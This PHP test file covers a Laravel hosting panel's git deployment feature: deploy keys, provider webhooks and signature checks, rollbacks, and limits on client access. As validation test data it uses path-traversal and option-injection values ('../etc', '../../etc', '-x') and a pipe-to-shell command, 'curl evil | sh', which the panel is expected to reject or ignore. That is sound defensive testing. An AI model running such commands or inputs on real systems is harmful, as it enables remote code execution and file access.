<?php

namespace Tests\Feature;

use App\Models\ActivityLog;
use App\Models\Customer;
use App\Models\User;
use App\Models\Website;
use App\Services\Agent\AgentException;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Str;
use Illuminate\Testing\TestResponse;
use Rhis\Git\Http\WebhookController;
use Rhis\Git\Models\GitDeployment;
use Rhis\Git\Models\GitRepository;
use Tests\TestCase;

class GitTest extends TestCase
{
    use RefreshDatabase;

    private const SHA = 'a1b2c3d4e5f6a7b8c9d0a1b2c3d4e5f6a7b8c9d0';

    /** @var array<string, string> job id => status the fake agent reports */
    private array $jobs = [];

    protected function setUp(): void
    {
        parent::setUp();
        $agent = $this->agent();
        $agent->respond('git.key', fn ($p) => ['public_key' => 'ssh-ed25519 AAAAC3NzaFake'.substr(md5($p['id'].($p['rotate'] ?? '')), 0, 8).' deploy@'.$p['domain'], 'fingerprint' => 'SHA256:fake']);
        $agent->respond('git.check', ['branches' => [['name' => 'main', 'commit' => self::SHA], ['name' => 'develop', 'commit' => str_repeat('b', 40)]], 'default' => 'main']);
        $agent->respond('git.status', ['deployed' => null, 'current_release' => '20261106093000-a1b2c3d', 'releases' => [
            ['name' => '20261106093000-a1b2c3d', 'commit' => 'a1b2c3d', 'current' => true, 'created' => 1793957400],
            ['name' => '20261105120000-9f8e7d6', 'commit' => '9f8e7d6', 'current' => false, 'created' => 1793880000],
        ], 'has_key' => true, 'path_is_link' => true]);
        $agent->respond('git.deploy', function () {
            $id = (string) Str::uuid();
            $this->jobs[$id] = 'running';

            return ['job' => $id];
        });
        $agent->respond('job.status', fn ($p) => [
            'id' => $p['job'], 'status' => $this->jobs[$p['job']] ?? 'succeeded', 'log' => ['Fetching main', 'Done in 4.2 s'],
            'result' => ($this->jobs[$p['job']] ?? 'succeeded') === 'succeeded' ? [
                'commit' => ['commit' => self::SHA, 'short' => 'a1b2c3d', 'message' => 'Nieuwe homepage', 'author' => 'Dev', 'date' => 1793957000],
                'release' => '20261106093000-a1b2c3d', 'steps' => [['type' => 'composer', 'status' => 'ok', 'seconds' => 3.1]], 'seconds' => 4.2,
            ] : null,
            'error' => ($this->jobs[$p['job']] ?? '') === 'failed' ? ['code' => 'command_failed', 'message' => 'Deploy step npm failed (exit code 1)'] : null,
        ]);
        $agent->respond('git.rollback', fn ($p) => ['release' => $p['release'], 'log' => ['Switched public to release '.$p['release']]]);
        $agent->respond('git.remove', fn ($p) => ['removed' => $p['id'], 'files_kept' => true]);
        $agent->respond('git.fetch', ['latest' => ['commit' => str_repeat('c', 40), 'short' => 'ccccccc', 'message' => 'Fix footer', 'author' => 'Dev', 'date' => 1793958000], 'deployed' => null]);
    }

    private function site(string $domain = 'klant.nl', ?Customer $customer = null, string $profile = 'laravel'): Website
    {
        $customer ??= Customer::create(['name' => 'Klant', 'email' => 'info@'.$domain]);

        return Website::create(['customer_id' => $customer->id, 'domain' => $domain, 'status' => 'active', 'profile' => $profile, 'ssl_status' => 'active']);
    }

    private function link(?Website $site = null, array $data = []): GitRepository
    {
        $site ??= $this->site();
        $this->actingAsAdmin();
        $this->post('/admin/git', $data + [
            'website_id' => $site->id, 'url' => 'git@github.com:rhis/klant-site.git', 'branch' => 'main', 'deploy_path' => 'app',
            'mode' => 'releases', 'auto_deploy' => '1', 'steps' => ['composer', 'artisan_migrate'], 'shared' => "storage/\n.env",
        ])->assertSessionHasNoErrors()->assertRedirect();

        return GitRepository::latest('id')->firstOrFail();
    }

    private function finishJobs(string $status = 'succeeded'): void
    {
        foreach (array_keys($this->jobs) as $id) {
            $this->jobs[$id] = $status;
        }
    }

    private function hook(GitRepository $repo, array $payload, array $headers = [], ?string $secret = null): TestResponse
    {
        $body = json_encode($payload);
        $sig = 'sha256='.hash_hmac('sha256', $body, $secret ?? $repo->webhook_secret);

        return $this->call('POST', "/git/webhook/{$repo->uuid}", [], [], [], $this->transformHeadersToServerVars($headers + [
            'Content-Type' => 'application/json', 'X-GitHub-Event' => 'push', 'X-Hub-Signature-256' => $sig,
        ]), $body);
    }

    private function push(string $branch = 'main', string $sha = self::SHA): array
    {
        return ['ref' => "refs/heads/{$branch}", 'after' => $sha, 'pusher' => ['name' => 'reinder'],
            'head_commit' => ['id' => $sha, 'message' => "Nieuwe homepage\n\nmeer tekst", 'author' => ['name' => 'Dev'], 'timestamp' => '2026-11-06T09:30:00Z']];
    }

    public function test_link_makes_a_deploy_key_and_shows_setup(): void
    {
        $repo = $this->link();

        $this->assertSame('github', $repo->provider);
        $this->assertSame('klant-site', $repo->name);
        $this->assertSame([['type' => 'composer'], ['type' => 'artisan_migrate']], $repo->steps);
        $this->assertSame(['storage/', '.env'], $repo->shared);
        $this->assertStringStartsWith('ssh-ed25519 ', $repo->public_key);
        $this->assertSame(40, strlen($repo->webhook_secret));
        $this->assertNotSame($repo->webhook_secret, \DB::table('git_repositories')->value('webhook_secret')); // encrypted at rest
        $this->assertSame(1, ActivityLog::where('action', 'git.create')->count());

        $this->get("/admin/git/{$repo->id}")->assertOk()
            ->assertSee($repo->public_key)->assertSee($repo->webhookUrl())->assertSee('Deploy keys')
            ->assertSee('20261105120000-9f8e7d6')->assertSee('Roll back');
        $this->get('/admin/git')->assertOk()->assertSee('klant-site')->assertSee('Zero downtime');
        $this->get("/admin/websites/{$repo->website_id}")->assertOk()->assertSee(route('admin.git.show', $repo), false);
    }

    public function test_create_form_suggests_defaults_per_website_type(): void
    {
        $this->site('wp.nl', profile: 'wordpress');
        $this->actingAsAdmin();
        $this->get('/admin/git/create')->assertOk()->assertSee('wp-content\/uploads\/', false)->assertSee('Zero downtime (recommended)');
    }

    public function test_input_is_validated(): void
    {
        $site = $this->site();
        $this->actingAsAdmin();
        foreach (['url' => 'file:///etc', 'deploy_path' => '../etc', 'branch' => '-x'] as $field => $bad) {
            $this->post('/admin/git', [
                'website_id' => $site->id, 'url' => 'git@github.com:a/b.git', 'branch' => 'main', 'deploy_path' => 'public', 'mode' => 'direct',
                $field => $bad,
            ])->assertSessionHasErrors($field);
        }
        $this->post('/admin/git', ['website_id' => $site->id, 'url' => 'git@github.com:a/b.git', 'branch' => 'main', 'deploy_path' => 'logs', 'mode' => 'direct'])
            ->assertSessionHasErrors('deploy_path');
        $this->assertSame(0, GitRepository::count());

        // Two repositories may not deploy into the same folder.
        $this->link($site);
        $this->post('/admin/git', ['website_id' => $site->id, 'url' => 'git@github.com:a/b.git', 'branch' => 'main', 'deploy_path' => 'app/public', 'mode' => 'direct'])
            ->assertSessionHasErrors('deploy_path');
    }

    public function test_manual_deploy_runs_a_job_and_stores_the_outcome(): void
    {
        $repo = $this->link();
        $this->post("/admin/git/{$repo->id}/deploy")->assertRedirect();
        $d = GitDeployment::firstOrFail();
        $this->assertSame('running', $d->status);
        $call = collect($this->agent()->calls)->where('action', 'git.deploy')->last()['params'];
        $this->assertSame(['domain' => 'klant.nl', 'id' => $repo->uuid, 'url' => 'git@github.com:rhis/klant-site.git', 'branch' => 'main',
            'path' => 'app', 'mode' => 'releases', 'keep' => 5, 'shared' => ['storage/', '.env'],
            'steps' => [['type' => 'composer'], ['type' => 'artisan_migrate']], 'allow_commands' => true], $call);
        $this->assertSame('deploying', $repo->refresh()->status);

        $this->getJson("/admin/git/{$repo->id}/deployments/{$d->id}")->assertOk()->assertJson(['status' => 'running', 'finished' => false]);
        $this->finishJobs();
        $this->get("/admin/git/{$repo->id}/deployments/{$d->id}")->assertOk()->assertSee('Nieuwe homepage')->assertSee('Done in 4.2 s');

        $repo->refresh();
        $this->assertSame('ok', $repo->status);
        $this->assertSame(self::SHA, $repo->deployed_commit['commit']);
        $this->assertSame('20261106093000-a1b2c3d', $repo->current_release);
        $this->assertFalse($repo->hasNewCommits());
    }

    public function test_failed_deploy_is_reported(): void
    {
        $repo = $this->link();
        $this->post("/admin/git/{$repo->id}/deploy");
        $this->finishJobs('failed');
        $this->artisan('whp:git:collect')->assertSuccessful();

        $this->assertSame('failed', $repo->refresh()->status);
        $this->assertSame('Deploy step npm failed (exit code 1)', $repo->last_error);
        $this->get("/admin/git/{$repo->id}")->assertSee('The last deployment failed')->assertSee('still runs the previous release');
    }

    public function test_github_webhook_deploys_the_branch_and_queues_one_more_on_a_burst(): void
    {
        $repo = $this->link();
        auth()->logout();

        $this->hook($repo, [], ['X-GitHub-Event' => 'ping'])->assertOk()->assertJson(['message' => 'pong']);
        $this->hook($repo, $this->push('develop'))->assertOk()->assertJson(['ignored' => 'branch']);
        $this->assertSame(0, GitDeployment::count());

        $this->hook($repo, $this->push())->assertStatus(202)->assertJson(['deploy' => true, 'status' => 'running']);
        $this->hook($repo, $this->push())->assertStatus(202)->assertJson(['status' => 'queued']);
        $this->hook($repo, $this->push())->assertStatus(202)->assertJson(['status' => 'queued']);
        $this->assertSame(1, GitDeployment::where('status', 'running')->count());
        $this->assertSame(1, GitDeployment::where('status', 'queued')->count());
        $this->assertSame('webhook', GitDeployment::first()->trigger);
        $this->assertSame('reinder', GitDeployment::first()->user);
        $this->assertSame('Nieuwe homepage', $repo->refresh()->latest_commit['message']);
        $this->assertNotNull($repo->last_webhook_at);

        // When the first one is done, the queued one starts.
        $this->finishJobs();
        $this->artisan('whp:git:collect')->assertSuccessful();
        $this->assertSame(1, GitDeployment::where('status', 'succeeded')->count());
        $this->assertSame(1, GitDeployment::where('status', 'running')->count());
        $this->assertSame(2, collect($this->agent()->calls)->where('action', 'git.deploy')->count());
    }

    public function test_webhook_rejects_wrong_signatures_and_unknown_repositories(): void
    {
        $repo = $this->link();
        $this->hook($repo, $this->push(), [], 'wrong-secret')->assertStatus(401);
        $this->call('POST', "/git/webhook/{$repo->uuid}", [], [], [], ['CONTENT_TYPE' => 'application/json'], json_encode($this->push()))->assertStatus(401);
        $this->hook($repo, $this->push(), [], null)->assertStatus(202);
        $this->postJson('/git/webhook/'.Str::uuid(), [])->assertNotFound();
        $this->postJson('/git/webhook/not-a-uuid', [])->assertNotFound();
    }

    public function test_manual_mode_only_marks_new_commits(): void
    {
        $repo = $this->link(data: ['auto_deploy' => '0']);
        $this->hook($repo, $this->push())->assertOk()->assertJson(['deploy' => false]);
        $this->assertSame(0, GitDeployment::count());
        $this->assertTrue($repo->refresh()->hasNewCommits());
        $this->get('/admin/git')->assertSee('New commits')->assertSee('Manual');
    }

    public function test_gitlab_gitea_and_bitbucket_payloads(): void
    {
        $repo = $this->link();
        $gitlab = ['ref' => 'refs/heads/main', 'checkout_sha' => self::SHA, 'user_name' => 'Jan', 'commits' => [['id' => self::SHA, 'message' => 'GitLab commit', 'author' => ['name' => 'Jan']]]];
        $this->call('POST', "/git/webhook/{$repo->uuid}", [], [], [], $this->transformHeadersToServerVars([
            'Content-Type' => 'application/json', 'X-Gitlab-Event' => 'Push Hook', 'X-Gitlab-Token' => $repo->webhook_secret,
        ]), json_encode($gitlab))->assertStatus(202);
        $this->assertSame('GitLab commit', $repo->refresh()->latest_commit['message']);

        $body = json_encode($this->push());
        $this->call('POST', "/git/webhook/{$repo->uuid}", [], [], [], $this->transformHeadersToServerVars([
            'Content-Type' => 'application/json', 'X-Gitea-Event' => 'push', 'X-Gitea-Signature' => hash_hmac('sha256', $body, $repo->webhook_secret),
        ]), $body)->assertStatus(202);

        $bb = WebhookController::push(['actor' => ['display_name' => 'Piet'], 'push' => ['changes' => [['new' => ['type' => 'branch', 'name' => 'main',
            'target' => ['hash' => self::SHA, 'message' => "Bitbucket\n", 'author' => ['raw' => 'Piet <p@x.nl>'], 'date' => '2026-11-06T09:00:00+00:00']]]]]]);
        $this->assertSame(['main', 'Bitbucket', 'Piet', false], [$bb['branch'], $bb['commit']['message'], $bb['pusher'], $bb['deleted']]);
        $deleted = WebhookController::push(['ref' => 'refs/heads/main', 'after' => str_repeat('0', 40), 'deleted' => true]);
        $this->assertTrue($deleted['deleted']);
        $tag = WebhookController::push(['ref' => 'refs/tags/v1.0', 'after' => self::SHA]);
        $this->assertSame('', $tag['branch']);
    }

    public function test_rollback_key_and_secret_rotation_and_removal(): void
    {
        $repo = $this->link();
        $oldKey = $repo->public_key;
        $oldSecret = $repo->webhook_secret;

        $this->post("/admin/git/{$repo->id}/rollback", ['release' => '20261105120000-9f8e7d6'])->assertSessionHasNoErrors();
        $this->assertSame('20261105120000-9f8e7d6', $repo->refresh()->current_release);
        $this->assertSame('rollback', GitDeployment::firstOrFail()->trigger);
        $this->post("/admin/git/{$repo->id}/rollback", ['release' => '../../etc'])->assertSessionHasErrors('release');

        $this->post("/admin/git/{$repo->id}/key");
        $this->assertNotSame($oldKey, $repo->refresh()->public_key);
        $this->post("/admin/git/{$repo->id}/secret");
        $this->assertNotSame($oldSecret, $repo->refresh()->webhook_secret);

        $this->post("/admin/git/{$repo->id}/check")->assertSessionHas('status');
        $this->post("/admin/git/{$repo->id}/fetch")->assertSessionHas('status');
        $this->assertSame('ccccccc', $repo->refresh()->latest_commit['short']);

        $this->delete("/admin/git/{$repo->id}")->assertRedirect('/admin/git');
        $this->assertSame(0, GitRepository::count());
        $this->assertSame(['domain' => 'klant.nl', 'id' => $repo->uuid, 'path' => 'app', 'shared' => ['storage/', '.env']],
            collect($this->agent()->calls)->where('action', 'git.remove')->last()['params']);
    }

    public function test_folder_and_mode_are_fixed_after_the_first_deployment(): void
    {
        $repo = $this->link();
        $repo->update(['deployed_commit' => ['commit' => self::SHA, 'short' => 'a1b2c3d']]);
        $this->put("/admin/git/{$repo->id}", ['url' => $repo->url, 'branch' => 'develop', 'deploy_path' => 'public', 'mode' => 'direct'])
            ->assertSessionHasErrors('mode');
        $this->put("/admin/git/{$repo->id}", ['url' => $repo->url, 'branch' => 'develop', 'deploy_path' => 'app', 'mode' => 'releases', 'auto_deploy' => '0', 'steps' => ['npm']])
            ->assertSessionHasNoErrors();
        $repo->refresh();
        $this->assertSame(['develop', false, [['type' => 'npm']]], [$repo->branch, $repo->auto_deploy, $repo->steps]);
    }

    public function test_client_sees_only_own_repositories_and_commands_can_be_switched_off(): void
    {
        $customer = Customer::create(['name' => 'Klant', 'email' => 'info@klant.nl']);
        $own = $this->link($this->site('klant.nl', $customer));
        $other = $this->link($this->site('ander.nl'));
        auth()->logout();

        $client = User::factory()->create(['customer_id' => $customer->id, 'role' => 'client']);
        $this->actingAs($client)->withSession(['two_factor_passed' => true]);
        $this->get('/git')->assertOk()->assertSee('klant-site')->assertDontSee('ander.nl');
        $this->get("/git/{$own->id}")->assertOk()->assertSee($own->public_key);
        $this->get("/git/{$other->id}")->assertNotFound();
        $this->post("/git/{$other->id}/deploy")->assertNotFound();
        $this->get('/git/create')->assertOk()->assertSee('klant.nl')->assertDontSee('ander.nl')->assertSee('Extra commands');
        $this->post('/git', ['website_id' => $other->website_id, 'url' => 'git@github.com:a/b.git', 'branch' => 'main', 'deploy_path' => 'public', 'mode' => 'direct'])
            ->assertSessionHasErrors('website_id');

        // With custom commands switched off, a command a customer sends is not stored or run.
        config(['git.customer_commands' => false]);
        $this->get('/git/create')->assertDontSee('Extra commands');
        $this->put("/git/{$own->id}", ['url' => $own->url, 'branch' => 'main', 'deploy_path' => 'app', 'mode' => 'releases', 'command' => 'curl evil | sh'])
            ->assertSessionHasNoErrors();
        $this->assertSame('', $own->refresh()->customCommand());
        $this->post("/git/{$own->id}/deploy");
        $this->assertFalse(collect($this->agent()->calls)->where('action', 'git.deploy')->last()['params']['allow_commands']);

        config(['git.customer_access' => false]);
        $this->get('/git')->assertNotFound();
    }

    public function test_pages_survive_an_unreachable_agent(): void
    {
        $repo = $this->link();
        $this->agent()->respond('git.status', AgentException::unreachable('socket down'));
        $this->agent()->respond('git.deploy', AgentException::unreachable('socket down'));
        $this->get("/admin/git/{$repo->id}")->assertOk()->assertSee('socket down');
        $this->post("/admin/git/{$repo->id}/deploy")->assertSessionHasErrors('agent');
        $this->assertSame('failed', $repo->refresh()->status);
    }

    public function test_dutch_translation(): void
    {
        $repo = $this->link();
        $admin = User::factory()->admin()->create(['locale' => 'nl']);
        $this->actingAsAdmin($admin);
        $this->get("/admin/git/{$repo->id}")->assertOk()->assertSee('Nu deployen')->assertSee('Verbinding testen');
    }
}
